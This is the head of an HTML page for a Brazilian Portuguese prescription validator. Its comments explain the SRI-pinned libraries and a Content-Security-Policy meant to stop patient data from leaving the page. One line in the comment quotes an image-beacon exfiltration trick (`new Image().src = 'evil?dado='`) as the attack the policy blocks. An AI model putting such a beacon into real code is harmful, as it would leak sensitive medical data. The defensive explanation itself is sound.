<!doctype html>
<html lang="pt-BR">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <!--
      O validador le dado de paciente. Entao:

      1. As libs de terceiro vem com VERSAO PINADA e `integrity` (SRI). Sem
         isso, um comprometimento do CDN (ou uma versao nova publicada com
         codigo malicioso) rodaria com acesso total a pagina — e a pagina tem
         prescricao e paciente em memoria. Com SRI o browser se recusa a
         executar se o byte mudar.
      2. O CSP fecha a SAIDA, que e o que importa aqui:
           - `connect-src 'self'`  -> nenhum fetch/XHR/WebSocket/beacon para
                                      fora. E a defesa principal: sem isso um
                                      script comprometido manda a prescricao
                                      para onde quiser.
           - `img-src 'self' data:` -> fecha o truque de exfiltrar via
                                      `new Image().src = 'evil?dado='`.
           - `script-src` com origem unica -> nada de script de outro dominio.
           - `object-src`/`base-uri`/`form-action 'none'`.

         O que este CSP NAO protege: `unsafe-eval` e `unsafe-inline` em
         script-src sao obrigatorios porque o Babel compila o JSX no browser e
         injeta o resultado como script inline (sem build step, regra do
         projeto). Logo, ele nao defende contra injecao de script na pagina —
         defende contra o script levar o dado embora. Hoje nao ha vetor de
         injecao (nenhum `innerHTML`/`eval` sobre dado do cliente), e quem
         fechar o `unsafe-eval` um dia precisa primeiro tirar o Babel do
         browser.
         `unsafe-inline` em style-src e porque o AntD injeta <style> em
         runtime.

      Para atualizar uma lib: mude a versao, recalcule o hash e troque os dois.
          curl -sL <url> | openssl dgst -sha384 -binary | openssl base64 -A
    -->
    <meta
      http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'unsafe-eval' 'unsafe-inline' https://cdn.jsdelivr.net;
               style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
               img-src 'self' data:;
               font-src 'self' data:;
               connect-src 'self';
               object-src 'none';
               base-uri 'none';
               form-action 'none'"
    />
